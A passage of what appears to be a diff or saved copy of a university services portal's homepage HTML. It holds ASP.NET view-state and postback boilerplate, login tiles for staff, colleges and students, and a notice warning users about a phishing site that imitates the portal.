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" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+var Anthem_FormID = "form1";
+//]]>
+</script>
+<script src="/WebResource.axd?d=3aJe5EVz5a65qlRd-GY67iYoy7ojYTwR-tSd9c0CDsUmcHt1KR-yKVXNeH-qFlPglp1xPCQ8ZdH4bXP1PBxgFi4GWT01&amp;t=638113606840000000" type="text/javascript"></script>
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="202EA31B" />
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="vhMbXI2Fk5WNGCMGiLptwinJqPZZG4B9YvfH6g90wtKjJTrZSM0G1Qpgd778FMtZQ8AHSqstwEHw5lJxMWrrt62LuJcalKlhuzpxcFROjMWi7J3N+fWoU/WIfacQUr2IwXpEiU2R6e8ucrTsx+Y+oBo5LaPaGGThSQnazZHaqo0lFPGD" />
+</div>
+        <div class="overlay"></div>
+        <div id="wrap" class="dashboard">
+            <div class="animsition backlayer" style="opacity: 1;">
+                <header class="topnavstrip mx-background-top-linear custom-mx-background">
+                    <div class="layerLeft dark-header" style="padding: 0;">
+                        <div class="horizontal_menu_Main">
+                            <div class="col-md-3">
+                                <ul>
+                                    <li><a href="#">
+                                        <div id="date" class="l_pg_d_t"></div>
+                                    </a></li>
+                                </ul>
+                            </div>
+                            <div class="col-md-9">
+                                <ul class="right">
+                                    
+                                    <li><a href="#" data-toggle="modal" data-target="#important-links"><i class="fa fa-fw fa-align-left"></i>&nbsp;Important Links</a></li>
+                                    <li><a href="#" data-toggle="modal" data-target="#news"><i class="fa fa-calendar"></i>&nbsp;News & Events</a></li>
+                                    <li><a href="#" data-toggle="modal" data-target="#notification"><i class="fa fa-bell-o" aria-hidden="true"></i>&nbsp;Instructions & Notifications</a><img src="img/gif-new.gif" /></li>
+                                    <li><a href="Loginpage.aspx"><i class="fa fa-fw fa-university" aria-hidden="true"></i>&nbsp;University Login</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="logo logo-black">
+                        <img class="img-responsive" src="/App_Themes/skyblue/images/logo.webp">
+                    </div>
+                    <div class="dateformatbg font-weight-bold">
+                        <a href="#" data-toggle="modal" data-target="#myModal"><i class="fa fa-info-circle" aria-hidden="true"></i>&nbsp;Helpline</a>
+
+                        <br />
+                        <span style="font-size: 10px"></span>
+                        <input type="hidden" name="PageID" id="PageID" />
+                        <button type="button" id="sidebarCollapse" class="btn btn-info btn-sm navbar-btn">
+                            
+                        </button>
+                    </div>
+                    
+                </header>
+
+
+
+                
+
+                
+
+                <div id="myCarousel" class="carousel slide" style="margin-bottom: 5px;" data-ride="carousel">
+                    <!-- Indicators -->
+                    <ol class="carousel-indicators">
+                        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+                        <li data-target="#myCarousel" data-slide-to="1"></li>
+                    </ol>
+                    <!-- Wrapper for slides -->
+                    <div class="carousel-inner">
+                        <div class="item active">
+                            <img src="img/rtu-banner-1.webp" alt="RTU" style="width: 100%;">
+                            <!--<div class="carousel-caption">
+                      <h3>Los Angeles</h3>
+                      <p>LA is always so much fun!</p>
+                    </div>-->
+                        </div>
+                        <div class="item">
+                            <img src="img/rtu-banner-2.webp" alt="RTU" style="width: 100%;">
+                        </div>
+                    </div>
+                    <!-- Left and right controls -->
+                    <a class="left carousel-control" href="#myCarousel" data-slide="prev"><span class="glyphicon glyphicon-chevron-left fa fa-chevron-left"></span><span class="sr-only">Previous</span> </a><a class="right carousel-control" href="#myCarousel" data-slide="next"><span class="glyphicon glyphicon-chevron-right fa fa-chevron-right"></span><span class="sr-only">Next</span> </a>
+                </div>
+
+                <div class="container-fluid">
+                    
+
+                    <div style="display: inline-block; width: 100%; background: #ff6e01; color: #fff; font-size: 14px; font-weight: 500; text-align: center; padding: 5px; border-radius: 5px; margin-top: 3px; margin-bottom: 8px;">
+                        NOTE :- Please be informed that a fraudulent phishing site resembling the SUMS portal is operating at <span class="flashbg">"https://rtusumsrajcom.app/"</span>. Everyone is strongly advised not to use this link.
+                    </div>
+                    <div class="demo-box" style="margin-bottom: 5px;">
+                        <div class="breaking-news-ticker" id="newsTicker1">
+                            <div class="bn-label">IMPORTANT LINKS</div>
+                            <div class="bn-news">
+                                <ul>
+                                    
+                                    <li><a href="#"><i class="fa fa-caret-right"></i>For Exam Form Query : +91-8826133117, Email : rtusumshelp@gmail.com</a></li>
+                                    <li><a href="#"><i class="fa fa-caret-right"></i>For Affiliation login, kindly use your existing college user ID and password.</a></li>
+                                    <li><a href="#"><i class="fa fa-caret-right"></i>For Exam Form Query : +91-8826133117,  Email : rtusumshelp@gmail.com</a></li>
+
+                                </ul>
+                            </div>
+
+
+                            <div class="bn-controls">
+                                <button><span class="bn-arrow bn-prev"></span></button>
+                                <button><span class="bn-action"></span></button>
+                                <button><span class="bn-arrow bn-next"></span></button>
+                            </div>
+
+                        </div>
+                    </div>
+
+
+
+                </div>
+
+
+                <!----module design start------>
+
+                <div class="container-fluid">
+                    <div class="panel with-nav-tabs panel-default">
+                        <div class="panel-heading">
+                            <ul class="nav nav-tabs">
+                                <li class="active"><a href="#tab1default" data-toggle="tab" data-toggle="tooltip" data-placement="top" title="University Department">University Department</a></li>
+                                <li><a href="#tab2default" data-toggle="tab" data-toggle="tooltip" data-placement="top" title="Colleges / Employees">Colleges / Employees </a></li>
+                                <li><a href="#tab3default" data-toggle="tab" data-toggle="tooltip" data-placement="top" title="Student Corner">Student Corner</a></li>
+                                <li><a href="#tab4default" data-toggle="tab" data-toggle="tooltip" data-placement="top" title="Bag Login">Bag Login</a></li>
+                                <li><a href="#tab5default" data-toggle="tab" data-toggle="tooltip" data-placement="top" title="Notice Board">Notice Board</a></li>
+                                <li><a href="#tab6default" data-toggle="tab" data-toggle="tooltip" data-placement="top" title="Others">Others</a></li>
+                            </ul>
+                        </div>
+                        <div class="panel-body">
+                            <div class="tab-content">
+                                <!----University Department start------>
+                                <div class="tab-pane fade in active custom-fade" id="tab1default">
+                                    <div class="row">
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="Loginpage.aspx">
+                                                                        <img class="co1" src="img/collegee.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="Loginpage.aspx">University Login </a>
+                                                                    <a class="m-texts" href="Loginpage.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+                                        <div class="col-sm-10-5">
+                                            <div class="card-homes1">
+                                                <img src="img/rtu-portal-banner.webp" width="100%">
+                                            </div>
+                                        </div>
+
+                                        
+                                    </div>
+                                </div>
+                                <!----University Department end------>
+
+                                <!----Colleges / Employees start------>
+                                <div class="tab-pane fade custom-fade" id="tab2default">
+
+
+                                    <div class="row">
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="Loginpage.aspx">
+                                                                        <img class="co1" src="img/collegee.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="Loginpage.aspx">College Login </a>
+                                                                    <a class="m-texts" href="Loginpage.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="Loginpage.aspx">
+                                                                        <img class="co2" src="img/student-portal.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="Loginpage.aspx">Employee Login </a>
+                                                                    <a class="m-texts" href="Loginpage.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="LoginAff.aspx">
+                                                                        <img class="co3" src="img/Affilation.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="LoginAff.aspx">Affiliation </a>
+                                                                    <a class="m-texts" href="LoginAff.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="LoginAffInspection.aspx">
+                                                                        <img class="co4" src="img/Affiliation_Inspection_Login.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="LoginAffInspection.aspx">Affiliation Inspection Login </a>
+                                                                    <a class="m-texts" href="LoginAffInspection.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+
+                                    </div>
+
+                                </div>
+                                <!----Colleges / Employees end------>
+
+                                <!----Student Corner start------>
+                                <div class="tab-pane fade custom-fade" id="tab3default">
+                                    <fieldset class="fieldset-border">
+                                        <legend>Students & Examination</legend>
+                                        <div class="row">
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Monitoring/Examination/Activity_Monitoring.aspx">
+                                                                            <img class="co1" src="img/notice_board.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="Monitoring/Examination/Activity_Monitoring.aspx">Notice Board </a>
+                                                                        <a class="m-texts" href="Monitoring/Examination/Activity_Monitoring.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="https://rtustudentportal.sumsraj.com/">
+                                                                            <img class="co2" src="img/student-portal.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="https://rtustudentportal.sumsraj.com/">Student Portal </a>
+                                                                        <a class="m-texts" href="https://rtustudentportal.sumsraj.com/">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Exam/Report/DownloadGradesheet.aspx">
+                                                                            <img class="co3" src="img/download_Result.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="Exam/Report/DownloadGradesheet.aspx">Download Result </a>
+                                                                        <a class="m-texts" href="Exam/Report/DownloadGradesheet.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Exam/Exam_Material/Download_AdmitCard.aspx">
+                                                                            <img class="co4" src="img/download-Admit_Card.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="Exam/Exam_Material/Download_AdmitCard.aspx">Download Admit Card </a>
+                                                                        <a class="m-texts" href="Exam/Exam_Material/Download_AdmitCard.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="HMS/HMS_PayLogin.aspx">
+                                                                            <img class="co8" src="img/hostel.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="HMS/HMS_PayLogin.aspx">Apply For Hostel First Year</a>
+                                                                        <a class="m-texts" href="HMS/HMS_PayLogin.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="https://rtustudentportal.sumsraj.com/">
+                                                                            <img class="co9" src="img/hostel-fee.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="https://rtustudentportal.sumsraj.com/">Hostel Fee Other Then First Year</a>
+                                                                        <a class="m-texts" href="https://rtustudentportal.sumsraj.com/">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="CollegePortal/StudentRegistration/Reg_Registration_Login.aspx">
+                                                                            <img class="co10" src="img/Admission-Registration-Login.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="CollegePortal/StudentRegistration/Reg_Registration_Login.aspx">Enrollment Registration For UD</a>
+                                                                        <a class="m-texts" href="CollegePortal/StudentRegistration/Reg_Registration_Login.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
